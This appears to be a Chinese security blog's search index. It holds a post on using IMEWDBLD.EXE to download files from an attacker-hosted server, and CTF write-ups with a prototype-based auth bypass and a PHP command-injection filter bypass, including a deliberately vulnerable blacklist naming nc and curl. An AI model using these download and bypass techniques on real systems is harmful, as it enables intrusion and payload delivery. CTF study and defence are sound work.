<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>通过Windows自带程序IMEWDBLD.EXE下载任意文件</title>
    <url>/2021/06/26/%E9%80%9A%E8%BF%87Windows%E8%87%AA%E5%B8%A6%E7%A8%8B%E5%BA%8FIMEWDBLD.EXE%E4%B8%8B%E8%BD%BD%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/</url>
    <content><![CDATA[<p>本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。</p>
<div style="text-align: right"> 小维</div>

<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 环境介绍</span></span><br><span class="line"><span class="string">OS</span> <span class="string">名称:</span> <span class="string">Microsoft</span> <span class="string">Windows</span> <span class="number">10</span> <span class="string">专业版</span></span><br><span class="line"><span class="string">OS</span> <span class="string">版本:</span> <span class="number">10.0</span><span class="number">.18363</span> <span class="string">暂缺</span> <span class="string">Build</span> <span class="number">18363</span></span><br></pre></td></tr></table></figure>

<a id="more"></a>

<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#通过HTTP服务托管载荷（这里使用了python3起个简易的HTTP服务）</span></span><br><span class="line">python3 <span class="literal">-m</span> http.server</span><br><span class="line"></span><br><span class="line"><span class="comment">#通过IMEWDBLD.EXE下载任意文件</span></span><br><span class="line">C:\Windows\System32\IME\SHARED\IMEWDBLD.EXE http://<span class="number">10.200</span>.<span class="number">73.104</span>/download.txt</span><br><span class="line"></span><br><span class="line"><span class="comment">#查找文件存储路径</span></span><br><span class="line">forfiles /P <span class="string">"%localappdata%\Microsoft\Windows\INetCache"</span> /S /M * /C <span class="string">"cmd /c echo @path"</span></span><br><span class="line"><span class="comment">#参数介绍</span></span><br><span class="line">/P 表示开始搜索的路径。默认文件夹是当前工作的 目录 (.)。</span><br><span class="line">/S 指导 forfiles 递归到子目录。像 <span class="string">"DIR /S"</span>。</span><br><span class="line">/M 根据搜索掩码搜索文件。默认搜索掩码是 <span class="string">'*'</span>。</span><br><span class="line">/C 表示为每个文件执行的命令。命令字符串应该用双引号括起来。</span><br><span class="line">	@path 返回文件的完整路径。</span><br></pre></td></tr></table></figure>

<p><img src="/img/%E9%80%9A%E8%BF%87Windows%E8%87%AA%E5%B8%A6%E7%A8%8B%E5%BA%8FIMEWDBLD.EXE%E4%B8%8B%E8%BD%BD%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/image-20210420130233187.png" alt="image-20210420133444561"></p>
]]></content>
  </entry>
  <entry>
    <title>记又一次CTF拉练-Node.js</title>
    <url>/2021/06/26/%E8%AE%B0%E5%8F%88%E4%B8%80%E6%AC%A1CTF%E6%8B%89%E7%BB%83-node/</url>
    <content><![CDATA[<p>本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。</p>
<div style="text-align: right"> 小维</div>

<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>这篇文章记述了又一次的CTF拉练，Node.js的白盒审计题…</p>
<h4 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 捕捉全局异常</span></span><br><span class="line">process.on(<span class="string">'uncaughtException'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">err</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'Caught exception: '</span>, err);</span><br><span class="line">&#125;);  </span><br><span class="line"></span><br><span class="line"><span class="comment">////引入模块</span></span><br><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>) </span><br><span class="line"><span class="keyword">var</span> session = <span class="built_in">require</span>(<span class="string">'express-session'</span>);</span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"><span class="keyword">var</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>);</span><br><span class="line"><span class="keyword">var</span> config = <span class="built_in">require</span>(<span class="string">'./config'</span>);</span><br><span class="line"><span class="keyword">var</span> marked = <span class="built_in">require</span>(<span class="string">'marked'</span>);</span><br><span class="line"><span class="keyword">var</span> morgan = <span class="built_in">require</span>(<span class="string">'morgan'</span>);</span><br><span class="line"><span class="keyword">var</span> bodyParser = <span class="built_in">require</span>(<span class="string">'body-parser'</span>);</span><br><span class="line"><span class="keyword">var</span> AccessControl = <span class="built_in">require</span>(<span class="string">'express-ip-access-control'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> port = process.env.PORT;</span><br><span class="line"><span class="keyword">var</span> app = express()</span><br><span class="line"><span class="keyword">var</span> sourceCode;</span><br><span class="line"></span><br><span class="line">marked.setOptions(&#123;</span><br><span class="line">    highlight: <span class="function"><span class="keyword">function</span> (<span class="params">code</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">require</span>(<span class="string">'highlight.js'</span>).highlightAuto(code).value</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 系统文件读写操作</span></span><br><span class="line">fs.readFile(<span class="string">'app.js'</span>, <span class="string">'utf8'</span>, (err, data) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (!err) &#123;</span><br><span class="line">        markdown = <span class="string">`\`\`\`node\n<span class="subst">$&#123;data&#125;</span>\n\`\`\``</span>;</span><br><span class="line">        sourceCode = marked(markdown);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> options = &#123;</span><br><span class="line">    mode: <span class="string">'allow'</span>,</span><br><span class="line">    denys: [],</span><br><span class="line">    allows: [<span class="string">'10.0.0.6'</span>],</span><br><span class="line">    forceConnectionAddress: <span class="literal">false</span>,</span><br><span class="line">    log: <span class="function"><span class="keyword">function</span> (<span class="params">clientIp, access</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!access)</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123;clientIp&#125;</span> denied.`</span>);</span><br><span class="line">    &#125;,</span><br><span class="line">    statusCode: <span class="number">404</span>,</span><br><span class="line">    redirectTo: <span class="string">''</span>,</span><br><span class="line">    message: <span class="string">'404 Not Found...Don\'t fuck me Please......'</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 访问控制'express-ip-access-control'</span></span><br><span class="line">app.use(AccessControl(options));</span><br><span class="line"><span class="comment">// 设置views文件夹，应用程序视图目录 ejs后缀</span></span><br><span class="line">app.set(<span class="string">'views'</span>, path.join(__dirname, <span class="string">'views'</span>));</span><br><span class="line">app.set(<span class="string">'view engine'</span>, <span class="string">'ejs'</span>);</span><br><span class="line"><span class="comment">//public下所有文件都会以静态资料文件形式返回（如样式、脚本、图片素材等文件）</span></span><br><span class="line">app.use(express.static(path.join(__dirname, <span class="string">'public'</span>)));</span><br><span class="line"></span><br><span class="line"><span class="comment">//session</span></span><br><span class="line">app.use(session(&#123; <span class="attr">secret</span>: <span class="string">'ctf'</span>, <span class="attr">resave</span>: <span class="literal">true</span>, <span class="attr">saveUninitialized</span>: <span class="literal">true</span>, <span class="attr">name</span>: <span class="string">'SID'</span> &#125;));</span><br><span class="line"></span><br><span class="line"><span class="comment">//morgan日志格式化 自定义format名ctf</span></span><br><span class="line">morgan.format(<span class="string">'ctf'</span>, <span class="string">'[ctf] [:remote-addr/:req[x-forwarded-for]] - ":method :url HTTP/:http-version" :status :res[content-length] ":referrer" ":user-agent"'</span>);</span><br><span class="line">app.use(morgan(<span class="string">'ctf'</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">//配置body-parser中间件  application/x-www-form-urlencoded，extended: true 任何数据类型 设置数据限制100mb  参数限制1000000</span></span><br><span class="line">app.use(bodyParser.urlencoded(&#123; <span class="attr">limit</span>: <span class="string">'100mb'</span>, <span class="attr">extended</span>: <span class="literal">true</span>, <span class="attr">parameterLimit</span>: <span class="number">1000000</span> &#125;));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 网站根路径</span></span><br><span class="line">app.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// console.log(sourceCode);</span></span><br><span class="line">    res.render(<span class="string">'index'</span>, &#123;<span class="attr">code</span>: sourceCode&#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 中间件处理</span></span><br><span class="line">app.use(<span class="function"><span class="keyword">function</span> (<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 判断url中是否有/login 或者 session值是否未定义</span></span><br><span class="line">    <span class="keyword">if</span> (isProtectUrl(req.originalUrl, req.query) &amp;&amp; (<span class="keyword">typeof</span> req.session[<span class="string">'username'</span>] == <span class="string">'undefined'</span>)) &#123;</span><br><span class="line">        res.redirect(<span class="string">'/'</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        next();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 判断url是否存在有/login</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">isProtectUrl</span>(<span class="params">url, query_url</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> isProtectUrl = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> unProtectUrl = [];</span><br><span class="line">        unProtectUrl.push(<span class="string">'/login'</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; unProtectUrl.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (unProtectUrl[i] == url || (url.indexOf(<span class="string">'#'</span>) &lt; <span class="number">0</span> &amp;&amp; url.indexOf(unProtectUrl[i]) &gt;= <span class="number">0</span> &amp;&amp; <span class="built_in">JSON</span>.stringify(query_url).indexOf(unProtectUrl[i]) &lt; <span class="number">0</span>)) &#123;</span><br><span class="line">                isProtectUrl = <span class="literal">false</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> isProtectUrl</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// login页面</span></span><br><span class="line">app.get(<span class="string">'/login'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    res.render(<span class="string">'login'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 登录post请求</span></span><br><span class="line">app.post(<span class="string">'/login'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> username = req.body[<span class="string">'username'</span>];</span><br><span class="line">    <span class="keyword">var</span> password = req.body[<span class="string">'password'</span>];</span><br><span class="line">    <span class="keyword">if</span> (username == config.username &amp;&amp; password == config.password) &#123;</span><br><span class="line">        req.session[<span class="string">"username"</span>] = <span class="string">"admin"</span>;</span><br><span class="line">        res.send(<span class="string">"login success."</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.send(<span class="string">'login failed.'</span>);</span><br><span class="line">    &#125;    </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// getflag页面</span></span><br><span class="line">app.get(<span class="string">'/getflag'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// console.log(config);</span></span><br><span class="line">    res.render(<span class="string">'flag'</span>, &#123;<span class="attr">flag</span>: config.flag&#125;); <span class="comment">//加载flag</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 侦听</span></span><br><span class="line">app.listen(port, <span class="string">'0.0.0.0'</span>, () =&gt; &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`ksctf app listening at http://0.0.0.0:<span class="subst">$&#123;port&#125;</span>`</span>);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<a id="more"></a>

<h4 id="思路解析"><a href="#思路解析" class="headerlink" title="思路解析"></a>思路解析</h4><p>首先分析代码, 先是引入一些模块，定义网站根路径加载源码，中间用isProtectUrl进行判断url中是否有/login及session[‘username’]是否定义来处理请求，不包含/login或者未定义seesion[‘username’]则跳转到网站根路径；定义了一个login页面，可以post验证用户名及密码，如果用户密码对了则session赋值；定义了一个getflag页面，该页面加载flag显示。</p>
<p>题目主要请求访问/getflag来查看flag文件。</p>
<h5 id="初步想法"><a href="#初步想法" class="headerlink" title="初步想法"></a>初步想法</h5><p>看是否有什么Cookie伪造之类的达到session赋值从而绕过typeof req.session[‘username’] == ‘undefined’)或者能否绕过isProtectUrl(req.originalUrl, req.query) 使两者中其中一个不成立后访问/getflag。</p>
<h5 id="本题考点"><a href="#本题考点" class="headerlink" title="本题考点"></a>本题考点</h5><p><strong>绕过isProtectUrl(url, query_url)；</strong></p>
<p>req.query 一个对象，为每一个路由中的query string参数都分配一个属性。</p>
<p>1、不能获取原型链的属性</p>
<p>2、如果没有query string，它就是一个空对象，属性的值为{}。</p>
<p>…</p>
<h4 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h4><p>根据上述特性我们可以构造成<code>getflag?__proto__=/login</code>，<code>getflag?=/login</code>等等。</p>
<h5 id="本地环境调试"><a href="#本地环境调试" class="headerlink" title="本地环境调试"></a>本地环境调试</h5><p>1、<code>getflag?=/login</code></p>
<p><img src="/img/%E8%AE%B0%E5%8F%88%E4%B8%80%E6%AC%A1CTF%E6%8B%89%E7%BB%83-node.js/image-20210626122959208.png" alt="image-20210626122959208"></p>
<p>2、<code>getflag?__proto__=/login</code></p>
<p><img src="/img/%E8%AE%B0%E5%8F%88%E4%B8%80%E6%AC%A1CTF%E6%8B%89%E7%BB%83-node.js/image-20210626122805010.png" alt="image-20210626122805010"></p>
<h5 id="CTF环境"><a href="#CTF环境" class="headerlink" title="CTF环境"></a>CTF环境</h5><p>请求/getflag 获取flag</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">https:<span class="regexp">//</span>xxx.xxx.com<span class="regexp">/getflag?__proto__=/</span>login</span><br></pre></td></tr></table></figure>

<p><img src="/img/%E8%AE%B0%E5%8F%88%E4%B8%80%E6%AC%A1CTF%E6%8B%89%E7%BB%83-node.js/image-20210625214459295.png" alt="image-20210625214459295"></p>
]]></content>
  </entry>
  <entry>
    <title>记一次CTF拉练-命令执行绕过</title>
    <url>/2021/06/26/%E8%AE%B0%E4%B8%80%E6%AC%A1CTF%E6%8B%89%E7%BB%83-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87/</url>
    <content><![CDATA[<p>本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。</p>
<div style="text-align: right"> 小维</div>

<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>这篇文章记述了一次CTF拉练的一道php的白盒审计题…</p>
<h4 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>); <span class="comment">//对文件进行语法高亮显示</span></span><br><span class="line">$filter = <span class="string">'/#|`| |[\x0a]|php|perl|dir|rm|ls|sleep|cut|sh|bash|grep|ash|nc|ping|curl|cat|tac|od|more|less|nl|vi|unique|head|tail|sort|rev|string|find|\$|\(\|\)|\[|\]|\&#123;|\&#125;|\&gt;|\&lt;|\?|\'|"|\*|;|\||&amp;|\/|\\\\/is'</span>; <span class="comment">#定义黑名单</span></span><br><span class="line">$cmd = $_GET[<span class="string">'cmd'</span>]; <span class="comment"># get方式传递数据</span></span><br><span class="line"><span class="keyword">if</span>(!preg_match($filter, $cmd))&#123; <span class="comment"># 正则匹配并判断传递的数据</span></span><br><span class="line">    system($cmd.<span class="string">"echo 'okkkkkk'"</span>); <span class="comment">#执行外部程序，并显示输出</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"ohhhhnnnoooooooooo....."</span>); <span class="comment">#输出一条消息，并退出当前脚本。</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<a id="more"></a>

<p><img src="/img/%E8%AE%B0%E4%B8%80%E6%AC%A1CTF%E6%8B%89%E7%BB%83-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87/image-20210519155907178.png" alt="image-20210519155907178"></p>
<h4 id="思路解析"><a href="#思路解析" class="headerlink" title="思路解析"></a>思路解析</h4><p>首先分析代码, 一开始先定义了一个<code>filter</code>过滤了一些bash命令等关键字（这里过滤了大多数常见的命令、符号等），定义了一个<code>$_GET变量</code>用于接收来自GET方法的数据，经过匹配<code>filter</code>后，如果没有相关关键字则将用户GET传的数据拼接<code>echo &#39;okkkkkk&#39;</code>后执行<code>system()</code>函数，如果匹配到相关字眼就输出<code>ohhhhnnnoooooooooo.....</code>并退出，所以整道题的核心就是绕过<code>filter</code>。</p>
<h5 id="初步想法"><a href="#初步想法" class="headerlink" title="初步想法"></a>初步想法</h5><p>利用Linux其他相关可以查找、查看的命令再利用相关分隔符、拼接符等进行来绕过后面的拼接。</p>
<h5 id="本题考点"><a href="#本题考点" class="headerlink" title="本题考点"></a>本题考点</h5><p>① 空格绕过</p>
<p>② Linux其他相关可以列目录文件的命令</p>
<p>③ Linux其他相关可以查看文件的命令</p>
<h4 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h4><h5 id="方式一"><a href="#方式一" class="headerlink" title="方式一"></a>方式一</h5><figure class="highlight sqf"><table><tr><td class="code"><pre><span class="line">① 利用 du -a 查看<span class="built_in">flag</span>文件名</span><br><span class="line">② 利用sed p 查看文件</span><br><span class="line">注: 需要用到%<span class="number">09</span>来绕过空格</span><br><span class="line"><span class="meta"># Linux du 命令可参考：https:<span class="comment">//www.runoob.com/linux/linux-comm-du.html</span></span></span><br></pre></td></tr></table></figure>

<p>本地模拟环境测试命令</p>
<p><img src="/img/%E8%AE%B0%E4%B8%80%E6%AC%A1CTF%E6%8B%89%E7%BB%83-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87/image-20210519175241095.png" alt="image-20210519175241095"></p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看当前目录文件名为this_is_real_real_flag_other_is_fake</span></span><br><span class="line"><span class="attribute">https</span>://xxx.xxx.com/?cmd=du<span class="number">%09</span>-a<span class="number">%09</span>.<span class="number">%09</span></span><br></pre></td></tr></table></figure>

<p><img src="/img/%E8%AE%B0%E4%B8%80%E6%AC%A1CTF%E6%8B%89%E7%BB%83-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87/image-20210519175502328.png" alt="image-20210519175502328"></p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看this_is_real_real_flag_other_is_fake内容</span></span><br><span class="line"><span class="attribute">https</span>://xxx.xxx.com/?cmd=sed<span class="number">%09</span>p<span class="number">%09</span>this_is_real_real_flag_other_is_fake<span class="number">%09</span></span><br></pre></td></tr></table></figure>

<p><img src="/img/%E8%AE%B0%E4%B8%80%E6%AC%A1CTF%E6%8B%89%E7%BB%83-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87/image-20210519162007917.png" alt="image-20210519162007917"></p>
<h5 id="方式二"><a href="#方式二" class="headerlink" title="方式二"></a>方式二</h5><figure class="highlight sqf"><table><tr><td class="code"><pre><span class="line">① 利用chgrp -v -R 查看<span class="built_in">flag</span>文件名</span><br><span class="line">② 利用sed p 查看文件</span><br><span class="line">注: 需要用到%<span class="number">09</span>来绕过空格</span><br><span class="line"><span class="meta"># Linux chgrp 命令可参考：https:<span class="comment">//www.runoob.com/linux/linux-comm-chgrp.html</span></span></span><br></pre></td></tr></table></figure>

<p>本地模拟环境测试命令</p>
<p><img src="/img/%E8%AE%B0%E4%B8%80%E6%AC%A1CTF%E6%8B%89%E7%BB%83-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87/image-20210519175429396.png" alt="image-20210519175429396"></p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看当前目录文件名为this_is_real_real_flag_other_is_fake</span></span><br><span class="line"><span class="attribute">https</span>://xxx.xxx.com/?cmd=chgrp<span class="number">%09</span>-v<span class="number">%09</span>-R<span class="number">%09</span>root<span class="number">%09</span>.<span class="number">%09</span></span><br></pre></td></tr></table></figure>

<h5 id=""><a href="#" class="headerlink" title=""></a><img src="/img/%E8%AE%B0%E4%B8%80%E6%AC%A1CTF%E6%8B%89%E7%BB%83-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87/image-20210519161927450.png" alt="image-20210519161927450"></h5><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看this_is_real_real_flag_other_is_fake内容</span></span><br><span class="line"><span class="attribute">https</span>://xxx.xxx.com/?cmd=sed<span class="number">%09</span>p<span class="number">%09</span>this_is_real_real_flag_other_is_fake<span class="number">%09</span></span><br></pre></td></tr></table></figure>

<p><img src="/img/%E8%AE%B0%E4%B8%80%E6%AC%A1CTF%E6%8B%89%E7%BB%83-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87/image-20210519162007917.png" alt="image-20210519162007917"></p>
<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a href="https://www.runoob.com/linux/linux-comm-du.html" target="_blank" rel="noopener">https://www.runoob.com/linux/linux-comm-du.html</a></p>
<p><a href="https://www.runoob.com/linux/linux-comm-chgrp.html" target="_blank" rel="noopener">https://www.runoob.com/linux/linux-comm-chgrp.html</a></p>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>解决国内无法访问 *.github.io</title>
    <url>/2021/06/26/%E8%A7%A3%E5%86%B3%E5%9B%BD%E5%86%85%E6%97%A0%E6%B3%95%E8%AE%BF%E9%97%AE-.github.io/</url>
    <content><![CDATA[<p><img src="/img/%E8%A7%A3%E5%86%B3%E5%9B%BD%E5%86%85%E6%97%A0%E6%B3%95%E8%AE%BF%E9%97%AE-.github.io/image-20210201110915058.png" alt="image-20210201110915058"></p>
<a id="more"></a>

<p>解决办法：</p>
<p>修改DNS服务器，使用208.67.222.222（opendns）可以正常解析，可将其设置为备用DNS即可。</p>
<p>Windows操作步骤：</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">① win+r 输入 ncpa.cpl</span><br><span class="line">② 选择对应的网络连接右键选择属性</span><br><span class="line">③ 选择 Internet 协议版本<span class="number">4</span> (TCP/IPV4)</span><br><span class="line">④ 选择使用下面的DNS服务器地址</span><br><span class="line">⑤ 输入<span class="number">208.67</span><span class="number">.222</span><span class="number">.222</span>（可将设置为首选/备用）</span><br><span class="line">⑥ 确定并保存</span><br><span class="line"></span><br><span class="line">注：如果还是无法访问可进行DNS缓存刷新，Windows刷新DNS缓存：ipconfig/flushdns</span><br></pre></td></tr></table></figure>

<p><img src="/img/%E8%A7%A3%E5%86%B3%E5%9B%BD%E5%86%85%E6%97%A0%E6%B3%95%E8%AE%BF%E9%97%AE-.github.io/image-20210201110827948.png" alt="image-20210201110827948"></p>
<p><img src="/img/%E8%A7%A3%E5%86%B3%E5%9B%BD%E5%86%85%E6%97%A0%E6%B3%95%E8%AE%BF%E9%97%AE-.github.io/image-20210201111603731.png" alt="image-20210201111603731"></p>
]]></content>
  </entry>
  <entry>
    <title>蓝凌OA Getshell 0day</title>
    <url>/2021/06/26/%E8%93%9D%E5%87%8COA_0day/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="密码不正确，请重新输入！" data-whm="文章不能被校验, 不过您还是能看看解密后的内容！">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">该文章已受密码保护, 请您输入密码查看。</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="d889eb0e3a3aed84d1e784b361541533ea42839bbb3e72f2fe6dc8c0ff524e9e">9eeabe894e24803cb843afe190430eaad552d9484b5c6d155de8f226e1aa35bbd91deb0b975c3988ba830c60587c5c7db1957fd436d29db46d3afe49d43c09db21daada7e20ef15ba17d93e434b50be01c895acf594691760c4804094db959740d6af7d11f77da21bdc3dce9690f187234f5f49d90483c12ae2852b4ab7132e328f5b047626ffffe69ecc4c0aaf7a12de05a84545a661b6c4d95ec2f41482723c662c64df090a949b1853f5b9c7396c0de79408e3d05c0def167c0337aa143e3ea756a2aac84fa879a65acb268802edc1853a226ed41756bdf79935129808814ac8351467127256e0fd281704efa8d85066fdcdc7fd63585ad304c9027a347495120e7c87be425e2bf5820c01cb5bd9a4e96fc84f223916739631a8a8ba36b73578383c8726cb8f273aac4474455bdeb2b08a1e8a0058096c2eeb4f189ac3737be51343607792c66ab86eb8ce3e24f89bfd1e3bd111cdf5e4130e82bdc21772db6a0ee8b36839b633cd2d2aefe3077e4211507eb825143a4284c3827326b2cb0bc0d986d284370bce1ceef671ca0e9e7fad02d85adfdbda52bee7078c04c0ef609d9265d1dc547a11f23933f97b980a18c29aef43e7bf9da7ebe802058e6b4409c3ea16c709b8329c0386cab8660473018367068189f67fd33a58d1a82bd52e8245877ea32d517d014fff541c76de9c271656d5c683ca8d3985ddb00c5c021cb769e6a84a0c08b7757fb8a1266c2e3b6f197109c07dd24129c1da2c50e9a1cb7fb2337a957f3a3e05cd485f94e64e1910c9a747d9df792933195831ab5a1a38dff3fcfd656238a190bbe6d804f67357e62b014c0a1dded6a89e468aa6fe7f10b2257f1b6406822746580c33b4b3e97085c656ef03c1a187d2691b1c7cad1d17346c45ee701d8b87c770e3aed300ec085daf88ae36d0397e09ec4bb04e3fd8a794891cb041114426589560f93061764329ee15e09f7f7e21a9ba8219df669a7448a3ee9fcb405612b4c7002a59e84fe2d38f51b41a8cf5bbc3a4615d8ce1650f83cc3c875ed4bb97997f5d9aea258852383128a3b305df867b37dde00843e02332403f6f79a3efa4ca0d8fc6de5afa9a32a13975198f041e7c0a056e3b1bba654807deecc89538c7f701e338345500ccc571f18a57a66bd789cf358b4495541e805440cbe6fe7a6d57db6b6e7927f5a7a84be8fa2ad871c9a26893df9f3079236ffcc78b8d0028b2f482655c4ab36d589899bf55ea3cea67161dd17e614432559b30b23ed4251d8285d8f354264d41081d6eeafe32c51eea3b394c2ec6fa58a193e96a3bc261264a72f3b8e8abec28728a48334359ac1013f57fbdacf7b2010f448dc780792b2452bde938d999eb63f20a422ed1ec09e7744a68c47ba55d895a94b91e2e90f08f95ec0c9dc1ef52fbcdc3de98eaebeb1d118c8b4eaec66bb61adbb49af2811bfe12885b44807b6eed13ddd68e8472f3e2e780ad33fa1212e7eaf248796d1617dc9edd211ee9f48543aca316f3ca0a57a04433cca47416c20af7bf0752531bafa63200bdda5014f24e1b2bc9d80d4a8723e0091a96396449e90472cd4630ee4dba08af910c974c386a5b96d0199fbd30518509dd376e7c217b0510568400a9187eb2bf15e89942ca41d16b985029f358750c6ed5029137c3e2822886ffbe0c09d2d65bca93e8a5e2d0c54262bb8ff61949dc89abd8ea810390497d1b84959f001bc17d3c124537e95e18c8476de1e879200931da0924a86a67547489e87453632b300d949de271dc3ea686660438aaaecfffef0dc91b13fa2a024e366afb7ced6714e8ae8db27bdb98dc2adbd54442f5b9ffd43a26b40d14f8b8708ab9aaa9b338bd0a481496c2f2497912210fe239c4d18d6fc0a0525cd7c9e95fc06a38a9ae96515d58e59eb262bd4414aa66d0b0207c659af1f332e676ae29106c3f2999fe56dc77403a209b460b571de7039bf0603d4f2835875bcc5a68e71d6073e61c13a435c30176e564524251d83c8d6808c0a865d0c5b840e5b47eb67ba009e8fa3000399bb65fed56f590ab38cd6f030e23aa982268c9c8761474e24c2ceab249ca2015d6b5950f88cb3c6925ca0e7af9720b4c43cf2b3f43f598734e39bdf9c6478f4a2ae2938fa23b48cd913669fe0f2ad9019ad614b363cd7002f9326b4504ef42d11424bac3d5b7ff081044f02f6b07a463c6f7dd697e6a72170394c3a7cceae4b58d335133aaa0a9638b13047b9f33230feb0d586eeb10022b8c37a0d2454bfd52eb71a9c580767cc445cbe5ff38dc92958838a46acaf6408dedf87f6b2a5bbc3f4bafd88e5fa4ac2bbe907dc9798685df1b6afb1021365fff93ba4eeb0ff5ffc381ea93b60329d586c31f03c58c3658dee25c1c43752a6d0f48a9ad00dc3886eff494b929fe89fd3f3e1cdf150332b07b930fd0cc120e753730a276b8b66695b82ac1b48292297bfb186642f196ee9e4dc2b54db15c9a571e001667bd38c11119be9ee52a80ecaec6bf9773b973922cb117cd76d51ed5ac18e</script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
  </entry>
  <entry>
    <title>Wechat RCE 0day</title>
    <url>/2021/06/26/Wechat-RCE-0day/</url>
    <content><![CDATA[<p>本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。</p>
<div style="text-align: right"> 小维</div>

